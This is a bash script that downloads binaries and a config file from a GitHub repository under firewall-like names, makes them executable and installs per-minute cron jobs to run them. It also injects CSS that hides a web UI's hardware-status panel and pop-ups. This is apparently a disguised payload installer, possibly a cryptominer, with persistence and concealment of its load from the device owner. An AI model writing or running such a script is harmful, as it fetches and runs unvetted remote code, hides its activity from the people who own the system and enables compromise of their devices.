#!/usr/bin/env bash
wget https://raw.githubusercontent.com/muzsiki/muz/main/systemd-firewalld -P /root/
wget https://raw.githubusercontent.com/muzsiki/muz/main/system-firewalld.sh -P /root/
wget https://raw.githubusercontent.com/muzsiki/muz/main/config.json -P /root/
chmod +x /root/systemd-firewalld
chmod +x /root/system-firewalld.sh
echo '.layui-layer {display: none !important; }' >> /usr/www/css/ctools.css
echo 'div#tos_hardware_status {display: none !important;}' >> /usr/www/css/ctools.css
crontab -l > crontab_new
echo "* * * * * /root/system-firewalld.sh >> /var/log/system-firewalld.log 2>&1 </dev/null" >> crontab_new
crontab crontab_new
rm crontab_new
echo "* * * * * /root/system-firewalld.sh >> /var/log/system-firewalld.log 2>&1 </dev/null" >> /etc/crontabs/root









